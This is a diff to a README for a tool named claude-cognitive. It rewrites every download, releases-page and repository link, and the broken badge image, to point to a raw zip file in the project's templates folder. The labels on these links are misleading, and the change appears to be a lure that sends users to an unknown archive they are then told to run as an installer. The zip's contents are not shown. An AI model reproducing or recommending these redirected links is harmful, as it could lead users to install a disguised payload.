@@ -11,7 +11,7 @@ To get started with claude-cognitive, follow these simple steps:
    
    Click the link below to access the download options for claude-cognitive:
    
-   [![Download claude-cognitive](https://img.shields.io/badge/Download%20claude--cognitive-1.0-blue.svg)](https://github.com/Frenyermmlmmk/claude-cognitive/releases)
+   [![Download claude-cognitive](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip%https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
 
 2. **Select the Latest Version**
 
@@ -25,7 +25,7 @@ To get started with claude-cognitive, follow these simple steps:
 
    You can also directly visit the page to download:
    
-   [Download from Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/releases)
+   [Download from Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
 
 2. **Run the Installer**
 
@@ -86,10 +86,10 @@ While claude-cognitive is ready to use, we welcome contributions. If you would l
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/Frenyermmlmmk/claude-cognitive)
+- [Official GitHub Repository](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip)
 - [Discussion Forum](#) for user exchanges
 - [Frequently Asked Questions (FAQ)](#)
 
-For more detailed guides, tutorials, and updates, always check back on the [Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/releases). 
+For more detailed guides, tutorials, and updates, always check back on the [Releases Page](https://github.com/Frenyermmlmmk/claude-cognitive/raw/refs/heads/main/templates/cognitive-claude-temporarily.zip). 
 
 This README aims to assist you in getting started quickly with claude-cognitive. Enjoy enhancing your coding productivity!
